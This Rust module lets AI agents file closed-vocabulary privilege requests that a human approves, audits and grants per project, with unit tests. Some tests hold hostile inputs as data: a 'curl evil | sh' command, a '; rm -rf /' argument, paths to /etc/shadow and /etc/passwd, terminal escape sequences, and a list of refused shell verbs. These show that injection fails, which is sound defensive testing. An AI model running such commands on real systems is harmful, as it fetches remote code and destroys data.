//! Structured privilege requests (roadmap §4).
//!
//! An agent that needs a privileged operation does not get a root shell and
//! does not get sudo. It describes what it wants:
//!
//! ```text
//! rime request install clang --reason "Required to compile the project"
//! ```
//!
//! and a human decides. The roadmap's words are "privileged operations should
//! be explicit structured requests routed through Rime policy. Avoid handing an
//! agent a general-purpose root shell where possible."
//!
//! ## Why the vocabulary is closed
//!
//! The single most important property here is that [`Verb`] is an enum and not
//! a string. An `Exec { command }` variant — "run this, with approval" — would
//! be sudo with a confirmation dialog: the approving human cannot meaningfully
//! review an arbitrary shell command, and one approval of `sh -c '…'` is
//! equivalent to permanent root. Every verb in this module maps to an `rime`
//! subcommand that already exists and already declares itself root-only, and
//! each one validates its own arguments.
//!
//! Adding a verb is therefore a deliberate act with a review attached, which is
//! the intended cost.
//!
//! ## Why arguments are validated here and not only downstream
//!
//! `rime-pkg` runs as root and already refuses a bad package name. This
//! validates again, earlier, for two reasons: the human approving the request
//! reads the arguments, so anything that renders misleadingly (a newline, an
//! escape sequence, a path pretending to be a package name) must never reach
//! the prompt; and a request is stored on disk between being made and being
//! approved, so it must not be possible to file one whose meaning changes
//! depending on what reads it back.
//!
//! ## What this module does NOT do
//!
//! It does not execute anything. Recording, validating, granting and auditing
//! live here; execution happens through the human's own privilege, because
//! `rime-agentd` is unprivileged by design (§2: "do not put agent
//! orchestration directly inside privileged rimed"). See [`Decision`] for what
//! "allow for project" does and does not currently buy.

use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};

use crate::origin::{Capability, OriginSource, Ruling};
use crate::policy::RequestOrigin;

/// The complete set of privileged operations an agent may ask for.
///
/// Deliberately an enum over `rime`'s existing root-only verbs. There is no
/// variant that takes a command line, and there must never be one — see the
/// module docs.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "verb", rename_all = "snake_case")]
pub enum Verb {
    /// `rime install <pkg>…`
    Install { packages: Vec<String> },
    /// `rime remove <pkg>…`
    Remove { packages: Vec<String> },
    /// `rime pkg upgrade` — re-resolve every package against the repositories.
    PkgUpgrade,
    /// `rime pkg rebuild` — rebuild the extension for the running OS.
    PkgRebuild,
    /// `rime pkg rollback` — restore the previous extension.
    PkgRollback,
    /// `rime pin` — pin the current deployment.
    Pin,
    /// `rime rollback` — boot the previous deployment.
    Rollback,
    /// `rime update` — bootc upgrade and firmware.
    Update,
}

/// Why a request could not be filed. Every variant is a refusal, never a
/// silent correction: a request whose arguments were quietly altered is a
/// request the human would approve on false terms.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RequestError {
    /// The verb name is not in the vocabulary.
    UnknownVerb(String),
    /// A verb that takes packages was given none.
    NoPackages,
    /// More packages than a single request may carry.
    TooManyPackages(usize),
    /// A package name rpm itself would not accept, or one carrying characters
    /// that would render misleadingly in the approval prompt.
    BadPackageName(String),
    /// The reason text is unusable (empty, or too long to display).
    BadReason(String),
    /// A verb that takes no arguments was given some.
    UnexpectedArguments(String),
}

impl std::fmt::Display for RequestError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            RequestError::UnknownVerb(v) => write!(
                f,
                "'{v}' is not a privileged operation an agent may request; \
                 run `rime request verbs` for the list"
            ),
            RequestError::NoPackages => {
                write!(f, "name at least one package")
            }
            RequestError::TooManyPackages(n) => write!(
                f,
                "{n} packages in one request; split it up so the approval \
                 prompt stays reviewable (limit {MAX_PACKAGES})"
            ),
            RequestError::BadPackageName(p) => write!(
                f,
                "'{}' is not a valid package name",
                p.escape_debug()
            ),
            RequestError::BadReason(why) => write!(f, "the reason {why}"),
            RequestError::UnexpectedArguments(v) => {
                write!(f, "'{v}' takes no arguments")
            }
        }
    }
}

impl std::error::Error for RequestError {}

/// Most packages anyone installs in one go. The limit exists so the approval
/// prompt cannot be flooded into unreadability — a human scrolling past forty
/// names to find the one that matters is not reviewing anything.
pub const MAX_PACKAGES: usize = 16;

/// Longest reason text kept. Long enough for a sentence, short enough that it
/// cannot push the verb and arguments off the top of a notification.
pub const MAX_REASON: usize = 400;

impl Verb {
    /// Parse a verb and its arguments as typed on the command line.
    ///
    /// `name` is the verb; `args` are whatever followed it. Validation is total:
    /// a `Verb` that exists has already been checked.
    pub fn parse(name: &str, args: &[String]) -> Result<Verb, RequestError> {
        let no_args = |v: Verb| -> Result<Verb, RequestError> {
            if args.is_empty() {
                Ok(v)
            } else {
                Err(RequestError::UnexpectedArguments(name.to_string()))
            }
        };
        match name {
            "install" => Ok(Verb::Install {
                packages: check_packages(args)?,
            }),
            "remove" => Ok(Verb::Remove {
                packages: check_packages(args)?,
            }),
            "pkg-upgrade" | "pkg_upgrade" => no_args(Verb::PkgUpgrade),
            "pkg-rebuild" | "pkg_rebuild" => no_args(Verb::PkgRebuild),
            "pkg-rollback" | "pkg_rollback" => no_args(Verb::PkgRollback),
            "pin" => no_args(Verb::Pin),
            "rollback" => no_args(Verb::Rollback),
            "update" => no_args(Verb::Update),
            other => Err(RequestError::UnknownVerb(other.to_string())),
        }
    }

    /// This verb's name, without its arguments.
    ///
    /// What a system-access grant is scoped by (§4.4's "capability-scoped").
    /// Deliberately coarser than [`Verb::grant_key`], which pins the exact
    /// arguments: a per-project grant is a standing decision and has to name
    /// the packages, while a session grant is a bounded window in which the
    /// user has said "this session may install things" — pinning the argument
    /// there would mean the grant covered nothing the user had not already
    /// approved individually, which is a grant that buys nothing.
    ///
    /// Every name here is in [`Verb::names`], and a test holds the two
    /// together, so a verb added to the vocabulary cannot arrive with a name
    /// no grant can be written against.
    pub fn name(&self) -> &'static str {
        match self {
            Verb::Install { .. } => "install",
            Verb::Remove { .. } => "remove",
            Verb::PkgUpgrade => "pkg-upgrade",
            Verb::PkgRebuild => "pkg-rebuild",
            Verb::PkgRollback => "pkg-rollback",
            Verb::Pin => "pin",
            Verb::Rollback => "rollback",
            Verb::Update => "update",
        }
    }

    /// Every verb name accepted by [`Verb::parse`], for `--help` and
    /// completion.
    pub fn names() -> &'static [&'static str] {
        &[
            "install",
            "remove",
            "pkg-upgrade",
            "pkg-rebuild",
            "pkg-rollback",
            "pin",
            "rollback",
            "update",
        ]
    }

    /// The `rime` command line this verb authorises, as argv without the
    /// leading `rime`.
    ///
    /// This is the ONLY place a request becomes a command, and it is built from
    /// the typed value rather than from any stored string — so a hand-edited
    /// request file cannot smuggle an extra argument past the approval.
    pub fn argv(&self) -> Vec<String> {
        let own = |s: &str| vec![s.to_string()];
        match self {
            Verb::Install { packages } => {
                let mut a = own("install");
                a.extend(packages.iter().cloned());
                a
            }
            Verb::Remove { packages } => {
                let mut a = own("remove");
                a.extend(packages.iter().cloned());
                a
            }
            Verb::PkgUpgrade => vec!["pkg".into(), "upgrade".into()],
            Verb::PkgRebuild => vec!["pkg".into(), "rebuild".into()],
            Verb::PkgRollback => vec!["pkg".into(), "rollback".into()],
            Verb::Pin => own("pin"),
            Verb::Rollback => own("rollback"),
            Verb::Update => own("update"),
        }
    }

    /// One line describing the KIND of operation, without its arguments.
    ///
    /// Used by `rime request verbs`, which is describing the vocabulary rather
    /// than any particular request. Separate from [`Verb::effect`] because that
    /// one names the actual packages — listing the vocabulary through it meant
    /// parsing a dummy package name and printing "(placeholder)" at the user.
    ///
    /// Both are one `match` over the same enum, so neither can drift away from
    /// the set of verbs that exists.
    pub fn kind_summary(&self) -> &'static str {
        match self {
            Verb::Install { .. } => "install packages on this machine",
            Verb::Remove { .. } => "remove packages from this machine",
            Verb::PkgUpgrade => "bring every installed package up to date",
            Verb::PkgRebuild => "rebuild the installed packages for the running system",
            Verb::PkgRollback => "go back to the previous set of installed packages",
            Verb::Pin => "pin the current deployment so an update cannot garbage-collect it",
            Verb::Rollback => "boot the previous deployment on the next restart",
            Verb::Update => "update the OS image and firmware",
        }
    }

    /// One line describing the effect of THIS request, for the approval prompt.
    /// Written for somebody deciding whether to allow it, not for a log.
    pub fn effect(&self) -> String {
        match self {
            Verb::Install { packages } => format!(
                "install {} on this machine ({})",
                plural(packages.len(), "package"),
                packages.join(", ")
            ),
            Verb::Remove { packages } => format!(
                "remove {} from this machine ({})",
                plural(packages.len(), "package"),
                packages.join(", ")
            ),
            Verb::PkgUpgrade => "bring every installed package up to date".into(),
            Verb::PkgRebuild => "rebuild the installed packages for the running system".into(),
            Verb::PkgRollback => "go back to the previous set of installed packages".into(),
            Verb::Pin => "pin the current deployment so an update cannot garbage-collect it".into(),
            Verb::Rollback => "boot the previous deployment on the next restart".into(),
            Verb::Update => "update the OS image and firmware".into(),
        }
    }

    /// Which row of §7's policy table this verb falls under.
    ///
    /// Every one of them is [`Capability::RootCapability`], and that is not a
    /// simplification: the vocabulary was chosen to be exactly `rime`'s
    /// root-only subcommands, so there is no verb here that is not a root
    /// operation. A `match` rather than a constant, so a verb added later has
    /// to state its row rather than inherit this one.
    pub fn capability(&self) -> Capability {
        match self {
            Verb::Install { .. }
            | Verb::Remove { .. }
            | Verb::PkgUpgrade
            | Verb::PkgRebuild
            | Verb::PkgRollback
            | Verb::Pin
            | Verb::Rollback
            | Verb::Update => Capability::RootCapability,
        }
    }

    /// The key a "allow for project" grant is stored under.
    ///
    /// Package verbs include the package set, so allowing `install clang` does
    /// not also allow `install anything-else`. That is the whole point of a
    /// grant being narrow: a broad grant is indistinguishable from no policy.
    pub fn grant_key(&self) -> String {
        match self {
            Verb::Install { packages } => format!("install:{}", sorted_join(packages)),
            Verb::Remove { packages } => format!("remove:{}", sorted_join(packages)),
            Verb::PkgUpgrade => "pkg-upgrade".into(),
            Verb::PkgRebuild => "pkg-rebuild".into(),
            Verb::PkgRollback => "pkg-rollback".into(),
            Verb::Pin => "pin".into(),
            Verb::Rollback => "rollback".into(),
            Verb::Update => "update".into(),
        }
    }
}

fn plural(n: usize, word: &str) -> String {
    if n == 1 {
        format!("1 {word}")
    } else {
        format!("{n} {word}s")
    }
}

/// Sorted so that `install a b` and `install b a` are the same grant. Without
/// this, an agent could re-ask for an already-granted set by reordering it and
/// get a second prompt — or worse, a user could believe a grant was narrower
/// than it is.
fn sorted_join(packages: &[String]) -> String {
    let mut v: Vec<&str> = packages.iter().map(String::as_str).collect();
    v.sort_unstable();
    v.dedup();
    v.join(",")
}

/// Validate a package list.
///
/// The name rule is rpm's own, the same expression `rime-pkg`'s
/// `valid_pkg_name` uses, which excludes `/` and every control character —
/// so a request can neither name a path nor smuggle a newline or an escape
/// sequence into the approval prompt.
fn check_packages(args: &[String]) -> Result<Vec<String>, RequestError> {
    if args.is_empty() {
        return Err(RequestError::NoPackages);
    }
    if args.len() > MAX_PACKAGES {
        return Err(RequestError::TooManyPackages(args.len()));
    }
    for p in args {
        if !valid_package_name(p) {
            return Err(RequestError::BadPackageName(p.clone()));
        }
    }
    Ok(args.to_vec())
}

/// `^[A-Za-z0-9_][A-Za-z0-9_.+-]*$`, hand-rolled because the crate has no
/// regex dependency and this is too important to approximate.
///
/// Note what is excluded and why: a leading `-` (which would be read as a flag
/// by whatever eventually runs), `/` and `.` at the start (paths), and every
/// byte outside the set — including control characters, which is what stops a
/// name from repainting the approval prompt.
pub fn valid_package_name(name: &str) -> bool {
    let mut chars = name.chars();
    match chars.next() {
        None => return false,
        Some(c) if c.is_ascii_alphanumeric() || c == '_' => {}
        Some(_) => return false,
    }
    chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '+' | '-'))
}

/// Validate the human-readable justification.
///
/// Required, because §4's example prompt has a Reason line and a prompt with an
/// empty reason teaches the user to approve without reading. Control characters
/// are refused for the same reason they are refused in package names.
pub fn check_reason(reason: &str) -> Result<String, RequestError> {
    let trimmed = reason.trim();
    if trimmed.is_empty() {
        return Err(RequestError::BadReason("must not be empty".into()));
    }
    if trimmed.chars().count() > MAX_REASON {
        return Err(RequestError::BadReason(format!(
            "must be at most {MAX_REASON} characters"
        )));
    }
    if trimmed.chars().any(|c| c.is_control()) {
        return Err(RequestError::BadReason(
            "must not contain control characters".into(),
        ));
    }
    Ok(trimmed.to_string())
}

/// What the human decided.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Decision {
    /// Waiting on a human.
    Pending,
    /// Approved for this request only.
    AllowOnce,
    /// Approved, and recorded as a grant so the identical request in the same
    /// project does not prompt again.
    ///
    /// It does NOT currently mean the operation runs unattended: execution goes
    /// through the approving human's own privilege, so a granted request still
    /// waits for `rime request approve`. Auto-execution would need a privileged
    /// executor — a new root-reachable-from-an-agent surface — and that is
    /// deliberately not built yet.
    AllowForProject,
    /// Refused.
    Denied,
}

impl Decision {
    pub fn as_str(&self) -> &'static str {
        match self {
            Decision::Pending => "pending",
            Decision::AllowOnce => "allow_once",
            Decision::AllowForProject => "allow_for_project",
            Decision::Denied => "denied",
        }
    }

    /// Parse a decision as typed by a human (`once`, `project`, `deny`).
    pub fn parse(s: &str) -> Option<Decision> {
        match s {
            "once" | "allow" | "allow_once" | "allow-once" => Some(Decision::AllowOnce),
            "project" | "allow_for_project" | "allow-for-project" => {
                Some(Decision::AllowForProject)
            }
            "deny" | "denied" | "no" => Some(Decision::Denied),
            "pending" => Some(Decision::Pending),
            _ => None,
        }
    }

    /// Whether the operation may proceed.
    pub fn is_allowed(&self) -> bool {
        matches!(self, Decision::AllowOnce | Decision::AllowForProject)
    }
}

/// One filed request, as stored and as shown.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PrivilegeRequest {
    pub id: u32,
    /// The verb, typed. Not a string: see the module docs.
    #[serde(flatten)]
    pub verb: Verb,
    /// Why the agent says it needs this.
    pub reason: String,
    /// Session that asked. Resolved by the daemon from the peer credentials of
    /// the connection, never from anything the client claimed.
    pub session: Option<u32>,
    /// Agent adapter id, for display.
    #[serde(default)]
    pub agent: Option<String>,
    /// Project root the session was running in.
    #[serde(default)]
    pub project: Option<String>,
    /// Where the request came from (§7's `request_origin`).
    ///
    /// Established by the daemon: inherited from the asking session, or
    /// observed from the connection when the peer is not a session. `None` is
    /// a record filed before origin tracking existed — deliberately not
    /// `local-terminal`, because an absent field must not read as the origin
    /// §7 reserves root for.
    #[serde(default)]
    pub request_origin: Option<RequestOrigin>,
    /// How [`PrivilegeRequest::request_origin`] was arrived at.
    #[serde(default)]
    pub origin_source: Option<OriginSource>,
    /// Which remote actor the origin was declared for, when one was named.
    ///
    /// A paired device id when the request reached the daemon through Rime
    /// Remote, `None` for everything else. `request_origin` says a remote
    /// something filed this; this says which device, which is what a human
    /// reading the prompt actually wants to know before handing out root.
    /// Never a key or a token — this record is on disk and in the audit log.
    #[serde(default)]
    pub actor: Option<String>,
    pub decision: Decision,
    /// Milliseconds since the epoch, when filed.
    pub created_ms: u64,
    /// Milliseconds since the epoch, when decided.
    #[serde(default)]
    pub decided_ms: Option<u64>,
    /// Set once the approved operation has actually been run, so an approval
    /// cannot be replayed into a second execution.
    #[serde(default)]
    pub executed_ms: Option<u64>,
    /// Exit status of the operation, when it has run.
    #[serde(default)]
    pub exit_code: Option<i32>,
    /// The §4.4 system-access grant that covered this request, when one did.
    ///
    /// A decided request has one of two authorities behind it, and an audit is
    /// read to tell them apart: a standing per-project grant the human left in
    /// `grants.json`, or a short-lived session grant that was authenticated at
    /// the top of this session and dies with it. Recording the grant id lets
    /// the two trails be joined — this record, and the `RIME_GRANT_ID` line
    /// journald holds for the same grant.
    #[serde(default)]
    pub system_grant: Option<u32>,
}

impl PrivilegeRequest {
    /// Whether this request has been decided and may still be executed.
    pub fn is_executable(&self) -> bool {
        self.decision.is_allowed() && self.executed_ms.is_none()
    }

    /// The `rime` command line this request authorises, built from the typed
    /// verb.
    pub fn argv(&self) -> Vec<String> {
        self.verb.argv()
    }

    /// Where this request came from, for display.
    ///
    /// A request filed before origin tracking existed has none recorded, and
    /// that is shown as `unknown` rather than guessed at. The distinction
    /// matters at exactly the moment the prompt is being read: a human
    /// deciding whether to hand out root should not be told "local" by a
    /// record that never said so.
    pub fn origin_summary(&self) -> String {
        match (self.request_origin, self.origin_source) {
            (Some(o), Some(s)) => format!("{o} ({s})"),
            (Some(o), None) => o.to_string(),
            (None, _) => "unknown — filed before origins were recorded".to_string(),
        }
    }

    /// Whether a human was at this machine when the request was made.
    ///
    /// `false` for a record with no origin: an unrecorded origin is not
    /// evidence of presence, and §7 reserves root for evidence of presence.
    pub fn is_local(&self) -> bool {
        self.request_origin.is_some_and(|o| o.is_local())
    }

    /// §7's answer for this request.
    ///
    /// [`Ruling::LocalAuth`] for one filed locally, [`Ruling::LocalApproval`]
    /// for one filed from anywhere else — and the same for one with no
    /// recorded origin, because an unrecorded origin is not a local one.
    /// Either way a human at this machine decides, which is why the two do not
    /// need different code paths in `rime-agentd`; they need different words
    /// in the prompt, and they get them.
    pub fn ruling(&self) -> Ruling {
        self.verb.capability().ruling_when(self.is_local())
    }

    /// The §4 prompt, rendered.
    pub fn prompt(&self) -> String {
        let who = self.agent.as_deref().unwrap_or("An agent");
        let mut out = format!("{who} requests:\n  rime {}\n\n", self.argv().join(" "));
        out.push_str(&format!("Reason:\n  {}\n\n", self.reason));
        out.push_str(&format!("Effect:\n  {}\n", self.verb.effect()));
        if let Some(p) = &self.project {
            out.push_str(&format!("Project:\n  {p}\n"));
        }
        // Last, and never omitted. §7's table has a different answer for a
        // remote origin than a local one, so the line the human reads before
        // approving has to say which column they are in — including when the
        // answer is that nobody recorded it.
        out.push_str(&format!("Origin:\n  {}\n", self.origin_summary()));
        out
    }
}

/// Milliseconds since the epoch. Used as the ordering key, for the same reason
/// checkpoints use it: two requests filed in the same second must still have a
/// defined order.
pub fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

// ── the store ───────────────────────────────────────────────────────────────
//
// One JSON file per request under $XDG_STATE_HOME/rime/agent/requests, and one
// append-only audit log. Files rather than a database because every other piece
// of runtime state here is a file, and because a human being able to read and
// diff the pending requests is a feature when the subject is privilege.

/// Where requests are stored.
pub fn requests_dir() -> PathBuf {
    crate::paths::state_dir().join("requests")
}

/// The append-only audit log. §4: "audit which agent used which capability and
/// when."
pub fn audit_log() -> PathBuf {
    crate::paths::state_dir().join("privilege-audit.jsonl")
}

/// Where per-project grants live.
pub fn grants_file() -> PathBuf {
    crate::paths::state_dir().join("grants.json")
}

fn record_path(dir: &Path, id: u32) -> PathBuf {
    dir.join(format!("{id}.json"))
}

/// Every request on disk, oldest first.
///
/// A file that will not parse is skipped rather than failing the listing: one
/// corrupt record must not make the rest of a user's pending requests
/// invisible, which is the state in which people start approving blind.
pub fn list(dir: &Path) -> std::io::Result<Vec<PrivilegeRequest>> {
    let mut out = Vec::new();
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(out),
        Err(e) => return Err(e),
    };
    for entry in entries.flatten() {
        if entry.path().extension().and_then(|s| s.to_str()) != Some("json") {
            continue;
        }
        if let Ok(text) = std::fs::read_to_string(entry.path()) {
            if let Ok(req) = serde_json::from_str::<PrivilegeRequest>(&text) {
                out.push(req);
            }
        }
    }
    out.sort_by_key(|r| (r.created_ms, r.id));
    Ok(out)
}

/// Read one request.
pub fn load(dir: &Path, id: u32) -> std::io::Result<Option<PrivilegeRequest>> {
    let path = record_path(dir, id);
    match std::fs::read_to_string(&path) {
        Ok(text) => Ok(serde_json::from_str(&text).ok()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
        Err(e) => Err(e),
    }
}

/// Write a request, replacing any previous version atomically.
pub fn save(dir: &Path, req: &PrivilegeRequest) -> std::io::Result<()> {
    crate::paths::ensure_private_dir(dir)?;
    let path = record_path(dir, req.id);
    let tmp = path.with_extension("json.tmp");
    let text = serde_json::to_string_pretty(req)?;
    std::fs::write(&tmp, text.as_bytes())?;
    std::fs::rename(&tmp, &path)?;
    Ok(())
}

/// The next free id.
///
/// Derived from what is on disk, and from the highest id seen rather than the
/// count: deleting request 3 of 1,2,3 must not make the next request reuse id
/// 3, because an audit trail with two different meanings for the same id is
/// not an audit trail.
pub fn next_id(dir: &Path) -> u32 {
    list(dir)
        .unwrap_or_default()
        .iter()
        .map(|r| r.id)
        .max()
        .unwrap_or(0)
        + 1
}

/// Append one line to the audit log.
///
/// Append-only and never rewritten. The log is the record of what privilege was
/// exercised on this machine and by what, so an operation that edits it in
/// place is a bug even when it looks like a tidy-up.
pub fn audit(path: &Path, event: &str, req: &PrivilegeRequest) -> std::io::Result<()> {
    use std::io::Write;

    if let Some(parent) = path.parent() {
        crate::paths::ensure_private_dir(parent)?;
    }
    let line = serde_json::json!({
        "ms": now_ms(),
        "event": event,
        "id": req.id,
        "argv": req.argv(),
        "reason": req.reason,
        "session": req.session,
        "agent": req.agent,
        "project": req.project,
        // §7 and P0-013's third criterion: the audit graph records origin.
        // Both halves — a line saying `claude-remote-control` without saying
        // whether the daemon observed that or a client asked for it answers
        // half the question an audit is read to answer.
        "request_origin": req.request_origin.map(|o| o.as_str()),
        "origin_source": req.origin_source.map(|s| s.as_str()),
        "decision": req.decision.as_str(),
        // Which authority decided it. A session grant is not a standing
        // project grant, and a line that cannot tell them apart cannot answer
        // "what was root allowed to do while that window was open".
        "system_grant": req.system_grant,
        "exit_code": req.exit_code,
    });
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)?;
    writeln!(file, "{line}")?;
    Ok(())
}

/// Per-project grants: project root -> the grant keys allowed in it.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Grants {
    #[serde(default)]
    pub projects: std::collections::BTreeMap<String, Vec<String>>,
}

impl Grants {
    pub fn load(path: &Path) -> Grants {
        std::fs::read_to_string(path)
            .ok()
            .and_then(|t| serde_json::from_str(&t).ok())
            .unwrap_or_default()
    }

    pub fn save(&self, path: &Path) -> std::io::Result<()> {
        if let Some(parent) = path.parent() {
            crate::paths::ensure_private_dir(parent)?;
        }
        let tmp = path.with_extension("json.tmp");
        std::fs::write(&tmp, serde_json::to_string_pretty(self)?.as_bytes())?;
        std::fs::rename(&tmp, path)?;
        Ok(())
    }

    /// Is this verb already allowed in this project?
    ///
    /// A request with no project is never granted: the grant is scoped to a
    /// project, so without one there is nothing to match and the safe answer is
    /// to ask.
    pub fn allows(&self, project: Option<&str>, verb: &Verb) -> bool {
        let Some(project) = project else {
            return false;
        };
        self.projects
            .get(project)
            .is_some_and(|keys| keys.iter().any(|k| k == &verb.grant_key()))
    }

    /// Record a grant. Idempotent.
    pub fn allow(&mut self, project: &str, verb: &Verb) {
        let keys = self.projects.entry(project.to_string()).or_default();
        let key = verb.grant_key();
        if !keys.contains(&key) {
            keys.push(key);
            keys.sort();
        }
    }

    /// Drop a grant. Returns whether anything was removed.
    ///
    /// A project left with no keys is removed entirely, so `rime request
    /// grants` shows nothing rather than an empty heading — an empty heading
    /// reads as "something is still granted here".
    pub fn revoke(&mut self, project: &str, key: &str) -> bool {
        let Some(keys) = self.projects.get_mut(project) else {
            return false;
        };
        let before = keys.len();
        keys.retain(|k| k != key);
        let removed = keys.len() != before;
        if keys.is_empty() {
            self.projects.remove(project);
        }
        removed
    }

    /// Drop every grant for a project. Returns how many were removed.
    pub fn revoke_project(&mut self, project: &str) -> usize {
        self.projects.remove(project).map_or(0, |k| k.len())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_verb_name_is_one_a_grant_can_be_written_against() {
        // `Verb::name` is what a system-access grant is scoped by, and
        // `Verb::names` is what the CLI lists and what a grant is built from.
        // A verb whose `name()` was not in `names()` would be uncoverable by
        // any grant — silently, and only for that one operation.
        for name in Verb::names() {
            let args = if matches!(*name, "install" | "remove") {
                vec!["clang".to_string()]
            } else {
                vec![]
            };
            let verb = Verb::parse(name, &args).expect("a real verb");
            assert_eq!(verb.name(), *name, "{name} round-trips to a different name");
            // And the coarse name is a prefix of the exact key, so the two
            // scopes cannot be about different operations.
            assert!(
                verb.grant_key().starts_with(verb.name()),
                "{name}: {} does not start with {}",
                verb.grant_key(),
                verb.name()
            );
        }
    }

    fn req(verb: Verb) -> PrivilegeRequest {
        PrivilegeRequest {
            id: 1,
            verb,
            reason: "Required to compile the project".into(),
            session: Some(4),
            agent: Some("claude".into()),
            project: Some("/home/tester/Projects/demo".into()),
            request_origin: Some(RequestOrigin::LocalTerminal),
            origin_source: Some(OriginSource::Inherited),
            actor: None,
            decision: Decision::Pending,
            created_ms: 1_700_000_000_000,
            decided_ms: None,
            executed_ms: None,
            exit_code: None,
            system_grant: None,
        }
    }

    // ── the closed vocabulary ───────────────────────────────────────────────

    #[test]
    fn there_is_no_way_to_request_an_arbitrary_command() {
        // The property that makes this module worth having. If a future variant
        // takes a command line, this test is where it should be argued for.
        for attempt in [
            "exec", "sh", "bash", "run", "sudo", "eval", "system", "shell", "command",
        ] {
            assert!(
                matches!(
                    Verb::parse(attempt, &["whoami".to_string()]),
                    Err(RequestError::UnknownVerb(_))
                ),
                "'{attempt}' must not be requestable"
            );
        }
    }

    #[test]
    fn every_advertised_verb_parses_and_every_parsed_verb_is_advertised() {
        for name in Verb::names() {
            let args = if name.starts_with("install") || name.starts_with("remove") {
                vec!["htop".to_string()]
            } else {
                vec![]
            };
            assert!(Verb::parse(name, &args).is_ok(), "{name} did not parse");
        }
        // And nothing outside the list does.
        assert!(Verb::parse("definitely-not-a-verb", &[]).is_err());
    }

    #[test]
    fn a_verb_that_takes_no_arguments_refuses_them() {
        // Otherwise `rime request pin --something` would file a request whose
        // prompt shows one thing and whose argv is another.
        for name in ["pin", "rollback", "update", "pkg-upgrade"] {
            assert!(matches!(
                Verb::parse(name, &["extra".to_string()]),
                Err(RequestError::UnexpectedArguments(_))
            ));
        }
    }

    // ── argument validation ─────────────────────────────────────────────────

    #[test]
    fn a_package_name_cannot_repaint_the_approval_prompt() {
        // The human reads the prompt to decide. A name containing a newline or
        // an escape sequence could show them an operation other than the one
        // being requested.
        for evil in [
            "clang\nremove everything",
            "clang\r",
            "clang\x1b[2J",
            "clang\x07",
            "clang\u{0}",
        ] {
            assert!(
                !valid_package_name(evil),
                "{:?} must be refused",
                evil.escape_debug().to_string()
            );
        }
    }

    #[test]
    fn a_package_name_cannot_be_a_path_or_a_flag() {
        for evil in [
            "/etc/passwd",
            "../../etc/shadow",
            "./local.rpm",
            "-rf",
            "--force",
            ".hidden",
            "",
        ] {
            assert!(!valid_package_name(evil), "{evil:?} must be refused");
        }
    }

    #[test]
    fn real_package_names_are_accepted() {
        // The names that motivated rpm's own rule. `java-1.8.0-openjdk` has
        // segments starting with digits and `python3.12` has dots; both are
        // real packages and both must work.
        for good in [
            "clang",
            "python3.12",
            "java-1.8.0-openjdk",
            "gcc-c++",
            "_special",
            "libstdc++-devel",
            "kernel-devel-6.11.3-200.fc41.x86_64",
        ] {
            assert!(valid_package_name(good), "{good:?} must be accepted");
        }
    }

    #[test]
    fn the_package_count_is_capped_so_the_prompt_stays_readable() {
        let many: Vec<String> = (0..MAX_PACKAGES + 1).map(|i| format!("pkg{i}")).collect();
        assert!(matches!(
            Verb::parse("install", &many),
            Err(RequestError::TooManyPackages(_))
        ));
        let ok: Vec<String> = (0..MAX_PACKAGES).map(|i| format!("pkg{i}")).collect();
        assert!(Verb::parse("install", &ok).is_ok());
    }

    #[test]
    fn install_needs_at_least_one_package() {
        assert!(matches!(
            Verb::parse("install", &[]),
            Err(RequestError::NoPackages)
        ));
    }

    #[test]
    fn a_reason_is_required_and_cannot_carry_control_characters() {
        assert!(check_reason("").is_err());
        assert!(check_reason("   ").is_err());
        assert!(check_reason("fine").is_ok());
        assert!(check_reason("two\nlines").is_err());
        assert!(check_reason(&"x".repeat(MAX_REASON + 1)).is_err());
        assert_eq!(check_reason("  padded  ").unwrap(), "padded");
    }

    // ── the argv a request authorises ───────────────────────────────────────

    #[test]
    fn argv_is_built_from_the_typed_verb_and_nothing_else() {
        let r = req(Verb::Install {
            packages: vec!["clang".into(), "cmake".into()],
        });
        assert_eq!(r.argv(), vec!["install", "clang", "cmake"]);
        assert_eq!(
            req(Verb::PkgUpgrade).argv(),
            vec!["pkg".to_string(), "upgrade".to_string()]
        );
        assert_eq!(req(Verb::Pin).argv(), vec!["pin".to_string()]);
    }

    #[test]
    fn a_hand_edited_record_cannot_smuggle_an_argument_into_the_argv() {
        // The stored form is the typed verb, so there is no free-text field
        // that reaches the command line. A record with an extra key is either
        // rejected or ignored — never executed.
        let mut r = req(Verb::Install {
            packages: vec!["clang".into()],
        });
        let text = serde_json::to_string(&r).unwrap();
        let mut v: serde_json::Value = serde_json::from_str(&text).unwrap();
        v["argv"] = serde_json::json!(["install", "clang", "; rm -rf /"]);
        v["command"] = serde_json::json!("sh -c 'curl evil | sh'");
        let back: PrivilegeRequest = serde_json::from_value(v).unwrap();
        assert_eq!(back.argv(), vec!["install", "clang"]);

        // And an invalid package inside the stored form still renders as
        // itself, because argv comes from the parsed value the request was
        // filed with.
        r.reason = "unchanged".into();
        assert_eq!(r.argv().len(), 2);
    }

    #[test]
    fn the_record_round_trips_through_json() {
        for verb in [
            Verb::Install {
                packages: vec!["clang".into()],
            },
            Verb::Remove {
                packages: vec!["htop".into()],
            },
            Verb::PkgUpgrade,
            Verb::PkgRebuild,
            Verb::PkgRollback,
            Verb::Pin,
            Verb::Rollback,
            Verb::Update,
        ] {
            let r = req(verb.clone());
            let text = serde_json::to_string(&r).expect("serialize");
            let back: PrivilegeRequest = serde_json::from_str(&text).expect("deserialize");
            assert_eq!(back.verb, verb, "{text}");
            assert_eq!(back.argv(), r.argv());
        }
    }

    // ── the prompt ──────────────────────────────────────────────────────────

    #[test]
